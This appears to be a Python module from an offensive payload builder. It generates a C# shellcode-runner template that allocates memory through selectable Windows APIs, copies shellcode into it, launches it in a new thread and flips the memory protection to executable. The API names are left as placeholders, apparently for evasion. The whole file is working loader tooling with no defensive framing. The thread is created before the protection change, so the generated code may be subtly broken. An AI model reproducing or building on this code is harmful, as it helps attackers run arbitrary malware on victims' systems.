from string import Template
from common.utils.argumentparser import ArgumentParser

class shellcoderunner:
    def __init__(self, arguments):
        parser = ArgumentParser(modulename=self.__class__.__name__)
        parser.add_argument(name='allocate', default='VirtualAlloc', help='Function used for allocating memory', choices={'VirtualAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx'})
        parser.add_argument(name='perm', default='rx', help='Protection of memory when shellcode executes', choices={'rx': '0x20', 'rwx':'0x40'})
        self.args = parser.parse_args(arguments)     

    def imports(self) -> list[str]:
        return ["using System;", 
                "using System.Collections.Generic;", 
                "using System.Linq;", 
                "using System.Text;", 
                "using System.Threading.Tasks;", 
                "using System.Diagnostics;", 
                "using System.Runtime.InteropServices;"]

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:

        template = """
            {transformers}
"""

        if self.args['allocate'] == 'VirtualAlloc':
            template += """
            IntPtr addr = {VirtualAlloc}(IntPtr.Zero, (ulong)shellcode.Length, 0x3000, 0x04);
"""
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += """
            IntPtr addr = IntPtr.Zero;
            IntPtr regionSize = new IntPtr(shellcode.Length); 
            {NtAllocateVirtualMemory}((IntPtr)(-1), out addr, 0, ref regionSize, 0x3000, 0x04);
"""
        elif self.args['allocate'] == 'VirtualAllocEx':
            template += """
            IntPtr addr = {VirtualAllocEx}((IntPtr)(-1), IntPtr.Zero, (ulong)shellcode.Length, 0x3000, 0x04);
            Console.WriteLine(addr);
"""

        template += Template("""
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            IntPtr hThread = {CreateThread}(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            IntPtr oldProtect;
            {VirtualProtect}(addr, (ulong)shellcode.Length, $memoryPermission, out oldProtect);

            {WaitForSingleObject}(hThread, 0xFFFFFFFF);
""").substitute(memoryPermission = self.args['perm'])

        return template